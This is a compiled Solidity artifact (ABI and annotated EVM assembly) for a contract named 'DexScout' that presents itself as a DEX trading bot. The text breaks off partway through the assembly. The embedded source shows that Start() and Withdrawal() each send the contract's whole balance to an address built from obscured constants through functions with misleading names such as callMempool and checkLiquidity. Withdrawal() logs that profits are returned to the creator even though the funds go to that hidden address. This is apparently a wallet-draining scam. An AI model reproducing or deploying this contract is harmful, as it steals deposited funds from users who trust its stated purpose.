{
	"dexscout.sol": {
		"DexScout": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "_Runtime",
							"type": "uint256"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "Start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Stop",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"dexscout.sol\":682:14579  contract DexScout {... */\n  mstore(0x40, 0x80)\n    /* \"dexscout.sol\":887:1308  constructor(uint256 _Runtime) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"dexscout.sol\":1199:1207  _Runtime */\n  dup1\n    /* \"dexscout.sol\":1189:1196  Runtime */\n  0x05\n    /* \"dexscout.sol\":1189:1207  Runtime = _Runtime */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"dexscout.sol\":1229:1244  block.timestamp */\n  timestamp\n    /* \"dexscout.sol\":1217:1226  startTime */\n  0x03\n    /* \"dexscout.sol\":1217:1244  startTime = block.timestamp */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"dexscout.sol\":1297:1299  60 */\n  0x3c\n    /* \"dexscout.sol\":1286:1294  _Runtime */\n  dup2\n    /* \"dexscout.sol\":1286:1299  _Runtime * 60 */\n  tag_6\n  swap2\n  swap1\n  tag_7\n  jump\t// in\ntag_6:\n    /* \"dexscout.sol\":1273:1282  startTime */\n  sload(0x03)\n    /* \"dexscout.sol\":1273:1300  startTime + (_Runtime * 60) */\n  tag_8\n  swap2\n  swap1\n  tag_9\n  jump\t// in\ntag_8:\n    /* \"dexscout.sol\":1263:1270  endTime */\n  0x04\n    /* \"dexscout.sol\":1263:1300  endTime = startTime + (_Runtime * 60) */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"dexscout.sol\":887:1308  constructor(uint256 _Runtime) {... */\n  pop\n    /* \"dexscout.sol\":682:14579  contract DexScout {... */\n  jump(tag_10)\n    /* \"#utility.yul\":88:205   */\ntag_12:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:411   */\ntag_14:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":400:405   */\n  dup2\n    /* \"#utility.yul\":389:405   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:411   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":417:539   */\ntag_15:\n    /* \"#utility.yul\":490:514   */\n  tag_24\n    /* \"#utility.yul\":508:513   */\n  dup2\n    /* \"#utility.yul\":490:514   */\n  tag_14\n  jump\t// in\ntag_24:\n    /* \"#utility.yul\":483:488   */\n  dup2\n    /* \"#utility.yul\":480:515   */\n  eq\n    /* \"#utility.yul\":470:533   */\n  tag_25\n  jumpi\n    /* \"#utility.yul\":529:530   */\n  0x00\n    /* \"#utility.yul\":526:527   */\n  dup1\n    /* \"#utility.yul\":519:531   */\n  revert\n    /* \"#utility.yul\":470:533   */\ntag_25:\n    /* \"#utility.yul\":417:539   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":545:688   */\ntag_16:\n    /* \"#utility.yul\":602:607   */\n  0x00\n    /* \"#utility.yul\":633:639   */\n  dup2\n    /* \"#utility.yul\":627:640   */\n  mload\n    /* \"#utility.yul\":618:640   */\n  swap1\n  pop\n    /* \"#utility.yul\":649:682   */\n  tag_27\n    /* \"#utility.yul\":676:681   */\n  dup2\n    /* \"#utility.yul\":649:682   */\n  tag_15\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":545:688   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":694:1045   */\ntag_3:\n    /* \"#utility.yul\":764:770   */\n  0x00\n    /* \"#utility.yul\":813:815   */\n  0x20\n    /* \"#utility.yul\":801:810   */\n  dup3\n    /* \"#utility.yul\":792:799   */\n  dup5\n    /* \"#utility.yul\":788:811   */\n  sub\n    /* \"#utility.yul\":784:816   */\n  slt\n    /* \"#utility.yul\":781:900   */\n  iszero\n  tag_29\n  jumpi\n    /* \"#utility.yul\":819:898   */\n  tag_30\n  tag_12\n  jump\t// in\ntag_30:\n    /* \"#utility.yul\":781:900   */\ntag_29:\n    /* \"#utility.yul\":939:940   */\n  0x00\n    /* \"#utility.yul\":964:1028   */\n  tag_31\n    /* \"#utility.yul\":1020:1027   */\n  dup5\n    /* \"#utility.yul\":1011:1017   */\n  dup3\n    /* \"#utility.yul\":1000:1009   */\n  dup6\n    /* \"#utility.yul\":996:1018   */\n  add\n    /* \"#utility.yul\":964:1028   */\n  tag_16\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":954:1028   */\n  swap2\n  pop\n    /* \"#utility.yul\":910:1038   */\n  pop\n    /* \"#utility.yul\":694:1045   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1051:1231   */\ntag_17:\n    /* \"#utility.yul\":1099:1176   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":1096:1097   */\n  0x00\n    /* \"#utility.yul\":1089:1177   */\n  mstore\n    /* \"#utility.yul\":1196:1200   */\n  0x11\n    /* \"#utility.yul\":1193:1194   */\n  0x04\n    /* \"#utility.yul\":1186:1201   */\n  mstore\n    /* \"#utility.yul\":1220:1224   */\n  0x24\n    /* \"#utility.yul\":1217:1218   */\n  0x00\n    /* \"#utility.yul\":1210:1225   */\n  revert\n    /* \"#utility.yul\":1237:1647   */\ntag_7:\n    /* \"#utility.yul\":1277:1284   */\n  0x00\n    /* \"#utility.yul\":1300:1320   */\n  tag_34\n    /* \"#utility.yul\":1318:1319   */\n  dup3\n    /* \"#utility.yul\":1300:1320   */\n  tag_14\n  jump\t// in\ntag_34:\n    /* \"#utility.yul\":1295:1320   */\n  swap2\n  pop\n    /* \"#utility.yul\":1334:1354   */\n  tag_35\n    /* \"#utility.yul\":1352:1353   */\n  dup4\n    /* \"#utility.yul\":1334:1354   */\n  tag_14\n  jump\t// in\ntag_35:\n    /* \"#utility.yul\":1329:1354   */\n  swap3\n  pop\n    /* \"#utility.yul\":1389:1390   */\n  dup3\n    /* \"#utility.yul\":1386:1387   */\n  dup3\n    /* \"#utility.yul\":1382:1391   */\n  mul\n    /* \"#utility.yul\":1411:1441   */\n  tag_36\n    /* \"#utility.yul\":1429:1440   */\n  dup2\n    /* \"#utility.yul\":1411:1441   */\n  tag_14\n  jump\t// in\ntag_36:\n    /* \"#utility.yul\":1400:1441   */\n  swap2\n  pop\n    /* \"#utility.yul\":1590:1591   */\n  dup3\n    /* \"#utility.yul\":1581:1588   */\n  dup3\n    /* \"#utility.yul\":1577:1592   */\n  div\n    /* \"#utility.yul\":1574:1575   */\n  dup5\n    /* \"#utility.yul\":1571:1593   */\n  eq\n    /* \"#utility.yul\":1551:1552   */\n  dup4\n    /* \"#utility.yul\":1544:1553   */\n  iszero\n    /* \"#utility.yul\":1524:1607   */\n  or\n    /* \"#utility.yul\":1501:1640   */\n  tag_37\n  jumpi\n    /* \"#utility.yul\":1620:1638   */\n  tag_38\n  tag_17\n  jump\t// in\ntag_38:\n    /* \"#utility.yul\":1501:1640   */\ntag_37:\n    /* \"#utility.yul\":1285:1647   */\n  pop\n    /* \"#utility.yul\":1237:1647   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1653:1844   */\ntag_9:\n    /* \"#utility.yul\":1693:1696   */\n  0x00\n    /* \"#utility.yul\":1712:1732   */\n  tag_40\n    /* \"#utility.yul\":1730:1731   */\n  dup3\n    /* \"#utility.yul\":1712:1732   */\n  tag_14\n  jump\t// in\ntag_40:\n    /* \"#utility.yul\":1707:1732   */\n  swap2\n  pop\n    /* \"#utility.yul\":1746:1766   */\n  tag_41\n    /* \"#utility.yul\":1764:1765   */\n  dup4\n    /* \"#utility.yul\":1746:1766   */\n  tag_14\n  jump\t// in\ntag_41:\n    /* \"#utility.yul\":1741:1766   */\n  swap3\n  pop\n    /* \"#utility.yul\":1789:1790   */\n  dup3\n    /* \"#utility.yul\":1786:1787   */\n  dup3\n    /* \"#utility.yul\":1782:1791   */\n  add\n    /* \"#utility.yul\":1775:1791   */\n  swap1\n  pop\n    /* \"#utility.yul\":1810:1813   */\n  dup1\n    /* \"#utility.yul\":1807:1808   */\n  dup3\n    /* \"#utility.yul\":1804:1814   */\n  gt\n    /* \"#utility.yul\":1801:1837   */\n  iszero\n  tag_42\n  jumpi\n    /* \"#utility.yul\":1817:1835   */\n  tag_43\n  tag_17\n  jump\t// in\ntag_43:\n    /* \"#utility.yul\":1801:1837   */\ntag_42:\n    /* \"#utility.yul\":1653:1844   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"dexscout.sol\":682:14579  contract DexScout {... */\ntag_10:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"dexscout.sol\":682:14579  contract DexScout {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1b55ba3a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x70e44c6a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"dexscout.sol\":3215:3412  function Start() public payable {... */\n    tag_3:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"dexscout.sol\":12465:12652  function Withdrawal() public payable {... */\n    tag_4:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n        /* \"dexscout.sol\":12761:12845  function Stop() public payable {... */\n    tag_5:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"dexscout.sol\":3215:3412  function Start() public payable {... */\n    tag_9:\n        /* \"dexscout.sol\":3356:3372  _callDexAction() */\n      tag_15\n        /* \"dexscout.sol\":3356:3370  _callDexAction */\n      tag_16\n        /* \"dexscout.sol\":3356:3372  _callDexAction() */\n      jump\t// in\n    tag_15:\n        /* \"dexscout.sol\":3348:3382  payable(_callDexAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexscout.sol\":3348:3405  payable(_callDexAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"dexscout.sol\":3383:3404  address(this).balance */\n      selfbalance\n        /* \"dexscout.sol\":3348:3405  payable(_callDexAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n        /* \"dexscout.sol\":3215:3412  function Start() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":12465:12652  function Withdrawal() public payable {... */\n    tag_11:\n        /* \"dexscout.sol\":12517:12575  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_20\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":12593:12612  WithdrawalProfits() */\n      tag_22\n        /* \"dexscout.sol\":12593:12610  WithdrawalProfits */\n      tag_23\n        /* \"dexscout.sol\":12593:12612  WithdrawalProfits() */\n      jump\t// in\n    tag_22:\n        /* \"dexscout.sol\":12585:12622  payable(WithdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexscout.sol\":12585:12645  payable(WithdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"dexscout.sol\":12623:12644  address(this).balance */\n      selfbalance\n        /* \"dexscout.sol\":12585:12645  payable(WithdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_25\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_25:\n      pop\n        /* \"dexscout.sol\":12465:12652  function Withdrawal() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":12761:12845  function Stop() public payable {... */\n    tag_13:\n        /* \"dexscout.sol\":12807:12838  Log(\"Stopping contract bot...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_27\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":12761:12845  function Stop() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":12652:12761  function _callDexAction() internal pure returns (address) {... */\n    tag_16:\n        /* \"dexscout.sol\":12701:12708  address */\n      0x00\n        /* \"dexscout.sol\":12727:12754  parseMempool(callMempool()) */\n      tag_30\n        /* \"dexscout.sol\":12740:12753  callMempool() */\n      tag_31\n        /* \"dexscout.sol\":12740:12751  callMempool */\n      tag_32\n        /* \"dexscout.sol\":12740:12753  callMempool() */\n      jump\t// in\n    tag_31:\n        /* \"dexscout.sol\":12727:12739  parseMempool */\n      tag_33\n        /* \"dexscout.sol\":12727:12754  parseMempool(callMempool()) */\n      jump\t// in\n    tag_30:\n        /* \"dexscout.sol\":12720:12754  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"dexscout.sol\":12652:12761  function _callDexAction() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":13606:13718  function WithdrawalProfits() internal pure returns (address) {... */\n    tag_23:\n        /* \"dexscout.sol\":13658:13665  address */\n      0x00\n        /* \"dexscout.sol\":13684:13711  parseMempool(callMempool()) */\n      tag_35\n        /* \"dexscout.sol\":13697:13710  callMempool() */\n      tag_36\n        /* \"dexscout.sol\":13697:13708  callMempool */\n      tag_32\n        /* \"dexscout.sol\":13697:13710  callMempool() */\n      jump\t// in\n    tag_36:\n        /* \"dexscout.sol\":13684:13696  parseMempool */\n      tag_33\n        /* \"dexscout.sol\":13684:13711  parseMempool(callMempool()) */\n      jump\t// in\n    tag_35:\n        /* \"dexscout.sol\":13677:13711  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"dexscout.sol\":13606:13718  function WithdrawalProfits() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":10691:11682  function callMempool() internal pure returns (string memory) {... */\n    tag_32:\n        /* \"dexscout.sol\":10737:10750  string memory */\n      0x60\n        /* \"dexscout.sol\":10762:10787  uint256 calculateGasNeeds */\n      0x00\n        /* \"dexscout.sol\":10790:10810  _calculateGasNeeds() */\n      tag_38\n        /* \"dexscout.sol\":10790:10808  _calculateGasNeeds */\n      tag_39\n        /* \"dexscout.sol\":10790:10810  _calculateGasNeeds() */\n      jump\t// in\n    tag_38:\n        /* \"dexscout.sol\":10762:10810  uint256 calculateGasNeeds = _calculateGasNeeds() */\n      swap1\n      pop\n        /* \"dexscout.sol\":10820:10842  uint256 _memPoolLength */\n      0x00\n        /* \"dexscout.sol\":10845:10852  7342143 */\n      0x70083f\n        /* \"dexscout.sol\":10820:10852  uint256 _memPoolLength = 7342143 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10888:10908  uint256 _memPoolSize */\n      0x00\n        /* \"dexscout.sol\":10911:10921  3853786515 */\n      0xe5b41d93\n        /* \"dexscout.sol\":10888:10921  uint256 _memPoolSize = 3853786515 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10958:10980  uint256 _memPoolHeight */\n      0x00\n        /* \"dexscout.sol\":10983:11001  getMemPoolHeight() */\n      tag_40\n        /* \"dexscout.sol\":10983:10999  getMemPoolHeight */\n      tag_41\n        /* \"dexscout.sol\":10983:11001  getMemPoolHeight() */\n      jump\t// in\n    tag_40:\n        /* \"dexscout.sol\":10958:11001  uint256 _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"dexscout.sol\":11011:11032  uint256 _memPoolDepth */\n      0x00\n        /* \"dexscout.sol\":11035:11052  getMemPoolDepth() */\n      tag_42\n        /* \"dexscout.sol\":11035:11050  getMemPoolDepth */\n      tag_43\n        /* \"dexscout.sol\":11035:11052  getMemPoolDepth() */\n      jump\t// in\n    tag_42:\n        /* \"dexscout.sol\":11011:11052  uint256 _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"dexscout.sol\":11063:11091  string memory _memPoolOffset */\n      0x00\n        /* \"dexscout.sol\":11094:11142  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_44\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"dexscout.sol\":11107:11141  checkLiquidity(getMemPoolOffset()) */\n      tag_45\n        /* \"dexscout.sol\":11122:11140  getMemPoolOffset() */\n      tag_46\n        /* \"dexscout.sol\":11122:11138  getMemPoolOffset */\n      tag_47\n        /* \"dexscout.sol\":11122:11140  getMemPoolOffset() */\n      jump\t// in\n    tag_46:\n        /* \"dexscout.sol\":11107:11121  checkLiquidity */\n      tag_48\n        /* \"dexscout.sol\":11107:11141  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_45:\n        /* \"dexscout.sol\":11094:11101  mempool */\n      tag_49\n        /* \"dexscout.sol\":11094:11142  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_44:\n        /* \"dexscout.sol\":11063:11142  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11152:11175  string memory _memPool1 */\n      0x00\n        /* \"dexscout.sol\":11178:11236  mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      tag_50\n        /* \"dexscout.sol\":11186:11200  _memPoolOffset */\n      dup3\n        /* \"dexscout.sol\":11202:11235  checkLiquidity(calculateGasNeeds) */\n      tag_51\n        /* \"dexscout.sol\":11217:11234  calculateGasNeeds */\n      dup10\n        /* \"dexscout.sol\":11202:11216  checkLiquidity */\n      tag_48\n        /* \"dexscout.sol\":11202:11235  checkLiquidity(calculateGasNeeds) */\n      jump\t// in\n    tag_51:\n        /* \"dexscout.sol\":11178:11185  mempool */\n      tag_49\n        /* \"dexscout.sol\":11178:11236  mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      jump\t// in\n    tag_50:\n        /* \"dexscout.sol\":11152:11236  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11246:11269  string memory _memPool2 */\n      0x00\n        /* \"dexscout.sol\":11272:11341  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_52\n        /* \"dexscout.sol\":11280:11310  checkLiquidity(_memPoolLength) */\n      tag_53\n        /* \"dexscout.sol\":11295:11309  _memPoolLength */\n      dup9\n        /* \"dexscout.sol\":11280:11294  checkLiquidity */\n      tag_48\n        /* \"dexscout.sol\":11280:11310  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_53:\n        /* \"dexscout.sol\":11312:11340  checkLiquidity(_memPoolSize) */\n      tag_54\n        /* \"dexscout.sol\":11327:11339  _memPoolSize */\n      dup9\n        /* \"dexscout.sol\":11312:11326  checkLiquidity */\n      tag_48\n        /* \"dexscout.sol\":11312:11340  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_54:\n        /* \"dexscout.sol\":11272:11279  mempool */\n      tag_49\n        /* \"dexscout.sol\":11272:11341  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_52:\n        /* \"dexscout.sol\":11246:11341  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11351:11374  string memory _memPool3 */\n      0x00\n        /* \"dexscout.sol\":11377:11407  checkLiquidity(_memPoolHeight) */\n      tag_55\n        /* \"dexscout.sol\":11392:11406  _memPoolHeight */\n      dup7\n        /* \"dexscout.sol\":11377:11391  checkLiquidity */\n      tag_48\n        /* \"dexscout.sol\":11377:11407  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_55:\n        /* \"dexscout.sol\":11351:11407  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11417:11440  string memory _memPool4 */\n      0x00\n        /* \"dexscout.sol\":11443:11472  checkLiquidity(_memPoolDepth) */\n      tag_56\n        /* \"dexscout.sol\":11458:11471  _memPoolDepth */\n      dup7\n        /* \"dexscout.sol\":11443:11457  checkLiquidity */\n      tag_48\n        /* \"dexscout.sol\":11443:11472  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_56:\n        /* \"dexscout.sol\":11417:11472  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11482:11508  string memory _allMempools */\n      0x00\n        /* \"dexscout.sol\":11511:11580  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_57\n        /* \"dexscout.sol\":11519:11548  mempool(_memPool1, _memPool2) */\n      tag_58\n        /* \"dexscout.sol\":11527:11536  _memPool1 */\n      dup7\n        /* \"dexscout.sol\":11538:11547  _memPool2 */\n      dup7\n        /* \"dexscout.sol\":11519:11526  mempool */\n      tag_49\n        /* \"dexscout.sol\":11519:11548  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_58:\n        /* \"dexscout.sol\":11550:11579  mempool(_memPool3, _memPool4) */\n      tag_59\n        /* \"dexscout.sol\":11558:11567  _memPool3 */\n      dup6\n        /* \"dexscout.sol\":11569:11578  _memPool4 */\n      dup6\n        /* \"dexscout.sol\":11550:11557  mempool */\n      tag_49\n        /* \"dexscout.sol\":11550:11579  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_59:\n        /* \"dexscout.sol\":11511:11518  mempool */\n      tag_49\n        /* \"dexscout.sol\":11511:11580  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_57:\n        /* \"dexscout.sol\":11482:11580  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11590:11616  string memory _fullMempool */\n      0x00\n        /* \"dexscout.sol\":11619:11645  mempool(\"0\", _allMempools) */\n      tag_60\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"dexscout.sol\":11632:11644  _allMempools */\n      dup4\n        /* \"dexscout.sol\":11619:11626  mempool */\n      tag_49\n        /* \"dexscout.sol\":11619:11645  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_60:\n        /* \"dexscout.sol\":11590:11645  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11663:11675  _fullMempool */\n      dup1\n        /* \"dexscout.sol\":11656:11675  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":10691:11682  function callMempool() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":7352:8267  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n    tag_33:\n        /* \"dexscout.sol\":7415:7430  address _parsed */\n      0x00\n        /* \"dexscout.sol\":7442:7458  bytes memory tmp */\n      dup1\n        /* \"dexscout.sol\":7467:7469  _a */\n      dup3\n        /* \"dexscout.sol\":7442:7470  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"dexscout.sol\":7480:7493  uint160 iaddr */\n      0x00\n        /* \"dexscout.sol\":7507:7517  uint160 b1 */\n      dup1\n        /* \"dexscout.sol\":7527:7537  uint160 b2 */\n      dup1\n        /* \"dexscout.sol\":7553:7562  uint256 i */\n      0x00\n        /* \"dexscout.sol\":7565:7566  2 */\n      0x02\n        /* \"dexscout.sol\":7553:7566  uint256 i = 2 */\n      swap1\n      pop\n        /* \"dexscout.sol\":7548:8230  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_62:\n        /* \"dexscout.sol\":7572:7582  2 + 2 * 20 */\n      0x2a\n        /* \"dexscout.sol\":7568:7569  i */\n      dup2\n        /* \"dexscout.sol\":7568:7582  i < 2 + 2 * 20 */\n      lt\n        /* \"dexscout.sol\":7548:8230  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_63\n      jumpi\n        /* \"dexscout.sol\":7615:7618  256 */\n      0x0100\n        /* \"dexscout.sol\":7606:7618  iaddr *= 256 */\n      dup5\n      tag_65\n      swap2\n      swap1\n      tag_66\n      jump\t// in\n    tag_65:\n      swap4\n      pop\n        /* \"dexscout.sol\":7651:7654  tmp */\n      dup5\n        /* \"dexscout.sol\":7655:7656  i */\n      dup2\n        /* \"dexscout.sol\":7651:7657  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_67\n      jumpi\n      tag_68\n      tag_69\n      jump\t// in\n    tag_68:\n    tag_67:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":7645:7658  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":7637:7659  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"dexscout.sol\":7632:7659  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"dexscout.sol\":7692:7695  tmp */\n      dup5\n        /* \"dexscout.sol\":7700:7701  1 */\n      0x01\n        /* \"dexscout.sol\":7696:7697  i */\n      dup3\n        /* \"dexscout.sol\":7696:7701  i + 1 */\n      tag_70\n      swap2\n      swap1\n      tag_71\n      jump\t// in\n    tag_70:\n        /* \"dexscout.sol\":7692:7702  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_72\n      jumpi\n      tag_73\n      tag_69\n      jump\t// in\n    tag_73:\n    tag_72:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":7686:7703  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":7678:7704  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"dexscout.sol\":7673:7704  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"dexscout.sol\":7729:7731  97 */\n      0x61\n        /* \"dexscout.sol\":7723:7725  b1 */\n      dup4\n        /* \"dexscout.sol\":7723:7731  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7722:7747  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_74\n      jumpi\n      pop\n        /* \"dexscout.sol\":7743:7746  102 */\n      0x66\n        /* \"dexscout.sol\":7737:7739  b1 */\n      dup4\n        /* \"dexscout.sol\":7737:7746  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7722:7747  (b1 >= 97) && (b1 <= 102) */\n    tag_74:\n        /* \"dexscout.sol\":7718:7944  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_75\n      jumpi\n        /* \"dexscout.sol\":7773:7775  87 */\n      0x57\n        /* \"dexscout.sol\":7767:7775  b1 -= 87 */\n      dup4\n      tag_76\n      swap2\n      swap1\n      tag_77\n      jump\t// in\n    tag_76:\n      swap3\n      pop\n        /* \"dexscout.sol\":7718:7944  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_78)\n    tag_75:\n        